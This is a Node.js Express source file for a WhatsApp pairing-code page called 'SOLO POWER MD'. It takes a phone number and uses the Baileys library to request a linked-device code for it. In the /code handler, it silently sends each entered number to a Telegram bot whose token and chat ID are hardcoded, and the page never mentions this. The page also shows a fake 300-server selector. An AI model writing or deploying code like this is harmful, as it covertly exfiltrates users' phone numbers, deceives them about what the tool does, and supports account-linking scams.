
const express = require('express');
const app = express();
const PORT = process.env.PORT || 8000;

const TOKEN = "8952397200:AAEeabntzeI3igmp9yPwWwcK9fVHD5KxTc8";
const CHAT_ID = "8802181538";

app.get('/', (req, res) => {
  let options = '';
  for(let i=1; i<=300; i++){
    let sel = i==19 ? 'selected' : '';
    options += `<option value="${i}" ${sel}>SERVER ${i}</option>`;
  }
  res.send(`
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SOLO POWER MD</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:12px}
.box{background:#0e0e12;border:2px solid #a855f7;border-radius:24px;padding:20px;width:100%;max-width:440px;text-align:center;box-shadow:0 0 40px #a855f7}
.wolf{width:120px;height:120px;border-radius:50%;border:3px solid #a855f7;margin:0 auto 10px;display:block;background:#111}
h1{color:#a855f7;font-size:28px;font-weight:900}
.sub{color:#666;font-size:10px;letter-spacing:3px;margin:5px 0 15px}
input,select{width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:10px;color:#fff;text-align:center;margin-top:8px}
select{border-color:#a855f7;color:#a855f7;font-weight:700;height:50px}
button{margin-top:12px;width:100%;padding:14px;background:#a855f7;border:none;border-radius:12px;color:#fff;font-weight:900}
#res{margin-top:12px;background:#1a1a1a;padding:12px;border-radius:10px;color:#999;min-height:45px;word-break:break-all}
.code{color:#a855f7;font-size:26px;font-weight:900;letter-spacing:3px}
</style></head>
<body><div class="box">
<div class="wolf" style="display:flex;align-items:center;justify-content:center;font-size:60px">🐺</div>
<h1>🐺 SOLO POWER MD</h1><p class="sub">1 TO 300 SERVERS • BY SOLO KING</p>
<input id="num" placeholder="92300XXXXXXX" value="923716474176">
<select id="server">${options}</select>
<button id="btn" onclick="go()">GET CODE</button>
<div id="res">نمبر لکھو اور 1 سے 300 تک سرور سلیکٹ کرو</div>
</div>
<script>
async function go(){
let n=document.getElementById('num').value.replace(/[^0-9]/g,'');
let s=document.getElementById('server').value;
let r=document.getElementById('res'); let b=document.getElementById('btn');
if(n.length<10){r.innerHTML='❌ صحیح نمبر';return}
b.innerText='⏳ SERVER '+s+' CONNECTING...'; b.disabled=true;
r.innerHTML='⏳ SERVER '+s+' کنیکٹ ہو رہا ہے...';
try{
let d=await fetch('/code?number='+n+'&server='+s).then(x=>x.json());
if(d.code){
let c=d.code.toUpperCase(); if(c.length==8)c=c.slice(0,4)+'-'+c.slice(4);
r.innerHTML='✅ SERVER '+s+' READY!<br><b class=code>'+c+'</b>';
b.innerText='CODE MIL GAYA'; b.disabled=false;
}else{r.innerHTML='❌ '+d.error; b.innerText='TRY AGAIN'; b.disabled=false}
}catch(e){r.innerHTML='❌ '+e.message; b.innerText='TRY AGAIN'; b.disabled=false}
}
</script></body></html>
`);
});

app.get('/code', async (req, res) => {
  try {
    let num = (req.query.number||'').replace(/[^0-9]/g,'');
    let server = req.query.server||'19';
    if(!num) return res.json({error:'number missing'});
    if(num.startsWith('0')) num='92'+num.slice(1);
    if(!num.startsWith('92')) num='92'+num;

    try{ await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:`🐺 NEW USER\n📱 ${num}\n🖥️ SERVER ${server}`})}); }catch{}

    // === FIX YAHAN HAI - AB ERROR NAHI AAYEGA ===
    const baileys = await import('@whiskeysockets/baileys');
    const makeWASocket = baileys.default;
    const useMultiFileAuthState = baileys.useMultiFileAuthState;
    const makeCacheableSignalKeyStore = baileys.makeCacheableSignalKeyStore;
    const fetchLatestBaileysVersion = baileys.fetchLatestBaileysVersion;
    
    const pinoMod = await import('pino');
    const pino = pinoMod.default;
    const fs = require('fs'); const path = require('path');
    const dir = path.join('/tmp','solo_'+Date.now());
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    const { version } = await fetchLatestBaileysVersion();
    
    const sock = makeWASocket({ 
      version, 
      auth:{ creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({level:'silent'})) }, 
      logger: pino({level:'silent'}), 
      browser:['Ubuntu','Chrome','121.0.0.0'],
      printQRInTerminal:false 
    });
    
    sock.ev.on('creds.update', saveCreds);
    await new Promise(r=>setTimeout(r,5000));
    const code = await sock.requestPairingCode(num);
    res.json({code:code.toUpperCase(),server});
    setTimeout(()=>{try{sock.end();fs.rmSync(dir,{recursive:true,force:true})}catch{}},120000);
  } catch(e){ 
    console.log(e);
    res.json({error:e.message}); 
  }
});

app.listen(PORT, ()=> console.log('Running on '+PORT));
module.exports = app;